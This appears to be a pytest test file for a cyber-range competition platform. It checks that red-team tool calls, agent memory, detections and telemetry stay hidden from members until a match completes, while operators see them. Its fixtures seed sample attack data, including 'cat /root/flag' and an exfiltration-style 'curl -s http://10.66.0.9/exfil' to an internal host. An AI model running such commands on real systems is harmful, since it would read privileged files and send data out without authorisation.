"""Plan 13 phase 7 — competition spoiler filtering (db layer).

In competition mode, member principals must not see red internals
(tool calls, agent memory, detection/verifier detail, telemetry command
content) before the match completes. Operators see everything, practice
is fully visible, completed matches are full history. Hiding a button is
never the control — enforcement lives in the API reads.
"""
from __future__ import annotations

import uuid as U
from datetime import datetime, timezone

import pytest

pytestmark = pytest.mark.db


def _comp_session(client, users):
    sid = client.post("/sessions", json={"scenario_id": "web-foothold-01",
                                         "mode": "competition"},
                      headers=users["member"]).json()["session_id"]
    return sid


def _seed_spoilers(sid):
    from srplatform.db.models import AgentState, Event
    from srplatform.db.session import db as db_ctx
    now = datetime.now(timezone.utc)
    with db_ctx() as s:
        s.add_all([
            Event(session_id=U.UUID(sid), ts=now, actor="red", host="web01",
                  action_type="tool_call", payload={"tool": "ssh-exec",
                                                    "cmd": "cat /root/flag"}),
            Event(session_id=U.UUID(sid), ts=now, actor="system",
                  action_type="detection",
                  payload={"objective": "foothold", "passed": True}),
            Event(session_id=U.UUID(sid), ts=now, actor="system",
                  action_type="verifier",
                  payload={"verifier": "flag_file_present",
                           "status": "failed"}),
            Event(session_id=U.UUID(sid), ts=now, actor="telemetry",
                  host="web01", action_type="command",
                  payload={"argv": "curl -s http://10.66.0.9/exfil"}),
            Event(session_id=U.UUID(sid), ts=now, actor="system",
                  action_type="session_ready", payload={"hosts": ["web01"]}),
        ])
        s.add(AgentState(session_id=U.UUID(sid),
                         summary="attack plan: privesc via maintenance helper",
                         current_phase="priv-esc"))
        s.commit()


def _complete_match(sid):
    from srplatform.db.models import MatchModel
    from srplatform.db.session import db as db_ctx
    with db_ctx() as s:
        m = s.get(MatchModel, U.UUID(sid))
        m.state = "completed"
        s.commit()


def test_competition_member_events_sealed_operator_sees_all(
        client, users):
    sid = _comp_session(client, users)
    _seed_spoilers(sid)
    evs = client.get(f"/events", params={"session_id": sid},
                      headers=users["member"]).json()
    by_kind = {e["action_type"]: e for e in evs}
    for kind in ("tool_call", "detection", "verifier", "command"):
        assert by_kind[kind]["payload"].get("redacted"), (kind, by_kind[kind])
        assert by_kind[kind].get("raw_ref") is None
    # metadata stays: presence, timing, host, kind
    assert by_kind["tool_call"]["host"] == "web01"
    # permitted service data untouched
    assert by_kind["session_ready"]["payload"] == {"hosts": ["web01"]}

    ops = client.get(f"/events", params={"session_id": sid},
                     headers=users["op"]).json()
    assert next(e for e in ops
                if e["action_type"] == "tool_call")["payload"]["cmd"] == \
        "cat /root/flag"


def test_competition_practice_stays_visible_and_completion_unseals(
        client, users):
    sid = client.post("/sessions", json={"scenario_id": "web-foothold-01"},
                      headers=users["member"]).json()["session_id"]
    _seed_spoilers(sid)
    evs = client.get(f"/events", params={"session_id": sid},
                      headers=users["member"]).json()
    assert next(e for e in evs
                if e["action_type"] == "tool_call")["payload"]["cmd"] == \
        "cat /root/flag"

    csid = _comp_session(client, users)
    _seed_spoilers(csid)
    _complete_match(csid)
    evs = client.get(f"/events", params={"session_id": csid},
                      headers=users["member"]).json()
    assert next(e for e in evs
                if e["action_type"] == "tool_call")["payload"]["cmd"] == \
        "cat /root/flag"


def test_competition_agent_memory_and_report_sealed(client, users):
    sid = _comp_session(client, users)
    _seed_spoilers(sid)
    r = client.get(f"/agent_state/{sid}", headers=users["member"])
    assert r.status_code == 403, r.text
    assert r.json()["detail"]["error"] == "competition_sealed"
    r = client.get(f"/agent_state/{sid}", headers=users["op"])
    assert r.status_code == 200 and "privesc" in r.json()["summary"]
    r = client.post(f"/sessions/{sid}/aar", json={},
                    headers=users["member"])
    assert r.status_code == 409, r.text


def test_competition_live_detections_and_score_sealed(client, users):
    sid = _comp_session(client, users)
    _seed_spoilers(sid)
    live = client.get(f"/sessions/{sid}/live",
                      headers=users["member"]).json()
    assert live["red_phase"] is None
    assert live["detections"], "presence is visible"
    assert all("objective" not in d and d.get("sealed") for d in
               live["detections"]), live["detections"]
    ops_live = client.get(f"/sessions/{sid}/live",
                          headers=users["op"]).json()
    assert ops_live["red_phase"] == "priv-esc"
    assert ops_live["detections"][0]["objective"] == "foothold"
